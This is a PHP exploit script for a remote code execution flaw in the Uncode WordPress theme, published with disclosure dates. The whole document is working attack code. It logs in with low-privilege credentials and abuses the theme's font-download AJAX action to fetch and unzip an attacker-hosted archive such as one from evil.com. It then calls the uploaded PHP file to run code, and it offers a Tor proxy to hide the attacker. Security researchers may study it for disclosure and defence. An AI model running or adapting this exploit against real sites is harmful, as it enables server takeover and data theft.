<?php
/**
 * Exploit Title: Uncode WP Theme RCE Expoit
 * Google Dork:
 * Exploit Author: wp0Day.com <contact@wp0day.com>
 * Vendor Homepage:
 * Software Link: http://themeforest.net/item/uncode-creative-multiuse-wordpress-theme/13373220
 * Version: 1.3.0 possible 1.3.1
 * Tested on: Debian 8, PHP 5.6.17-3
 * Type: RCE, Arbirary file UPLOAD, (Low Authenticated )
 * Time line: Found [24-APR-2016], Vendor notified [24-APR-2016], Vendor fixed: [27-APR-2016], [RD:1464134400]
 */


require_once('curl.php');
//OR
//include('https://raw.githubusercontent.com/svyatov/CurlWrapper/master/CurlWrapper.php');
$curl = new CurlWrapper();


$options = getopt("t:u:p:f:",array('tor:'));
print_r($options);
$options = validateInput($options);

if (!$options){
    showHelp();
}

if ($options['tor'] === true)
{
    echo " ### USING TOR ###\n";
    echo "Setting TOR Proxy...\n";
    $curl->addOption(CURLOPT_PROXY,"http://127.0.0.1:9150/");
    $curl->addOption(CURLOPT_PROXYTYPE,7);
    echo "Checking IPv4 Address\n";
    $curl->get('https://dynamicdns.park-your-domain.com/getip');
    echo "Got IP : ".$curl->getResponse()."\n";
    echo "Are you sure you want to do this?\nType 'wololo' to continue: ";
    $answer = fgets(fopen ("php://stdin","r"));
    if(trim($answer) != 'wololo'){
        die("Aborting!\n");
    }
    echo "OK...\n";
}


function logIn(){
    global $curl, $options;
    file_put_contents('cookies.txt',"\n");
    $curl->setCookieFile('cookies.txt');
    $curl->get($options['t']);
    $data = array('log'=>$options['u'], 'pwd'=>$options['p'], 'redirect_to'=>$options['t'], 'wp-submit'=>'Log In');
    $curl->post($options['t'].'/wp-login.php', $data);
    $status =  $curl->getTransferInfo('http_code');
    if ($status !== 302){
        echo "Login probably failed, aborting...\n";
        echo "Login response saved to login.html.\n";
        die();
    }
    file_put_contents('login.html',$curl->getResponse());


}

function exploit(){
    global $curl, $options;
    echo "Generateing payload.\n";
    $data = array('action'=>'uncodefont_download_font', 'font_url'=>$options['f']);
    echo "Sending payload\n";
    $curl->post($options['t'].'/wp-admin/admin-ajax.php', $data);
    $resp = $curl->getResponse();
    echo "Eco response: ".$resp."\n";
    $resp = json_decode($resp,true);
    if ($resp['success'] === 'Font downloaded and extracted successfully.'){
        echo "Response ok, calling RCE\n";
        $file_path = parse_url($options['f']);
        $remote_file_info = pathinfo($file_path['path']);
        $zip_file_name = $remote_file_info['basename'];
        $zip_file_name_php  = str_replace('.zip', '.php', $zip_file_name);
        $url = $options['t'].'wp-content/uploads/uncode-fonts/'.$zip_file_name.'/'.$zip_file_name_php;
        echo 'Url: '. $url."\n";
        //POC Test mode
        if ($file_path['host'] == 'wp0day.com'){
            echo "Exploit test mode on\n";
            $rnd = rand();
            echo "Rand $rnd, MD5: ".md5($rnd)."\n";
            $url = $url . '?poc='.$rnd;
        }
        $curl->get($url);
        echo "RCE Response:";
        echo $curl->getResponse()."\n\n";
    }
}


logIn();
exploit();



function validateInput($options){

    if ( !isset($options['t']) || !filter_var($options['t'], FILTER_VALIDATE_URL) ){
        return false;
    }
    if ( !isset($options['u']) ){
        return false;
    }
    if ( !isset($options['p']) ){
        return false;
    }
    if ( !isset($options['f']) ){
        return false;
    }
    if (!preg_match('~/$~',$options['t'])){
        $options['t'] = $options['t'].'/';
    }

    $options['tor'] = isset($options['tor']);

    return $options;
}


function showHelp(){
    global $argv;
    $help = <<<EOD

    Uncode WP Theme RCE Expoit

Usage: php $argv[0] -t [TARGET URL] --tor [USE TOR?] -u [USERNAME] -p [PASSWORD] -f [URL]

       *** You need to have a valid login (customer or subscriber will do) in order to use this "exploit" **

       [TARGET_URL] http://localhost/wordpress/
       [URL] It must be ZIP file. It gets unzipped into /wp-content/uploads/uncode-fonts/[some.zip]/files folder
       Example: rce.php -> zip -> rce.zip -> http://evil.com/rce.zip -> /wp-content/uploads/uncode-fonts/rce.zip/rce.php



Examples:
       php $argv[0] -t http://localhost/wordpress --tor=yes -u customer1 -p password -f http://wp0day.com/res/php/poc.zip

    Misc:
           CURL Wrapper by Leonid Svyatov <leonid@svyatov.ru>
           @link http://github.com/svyatov/CurlWrapper
           @license http://www.opensource.org/licenses/mit-license.html MIT License

EOD;
    echo $help."\n\n";
    die();
}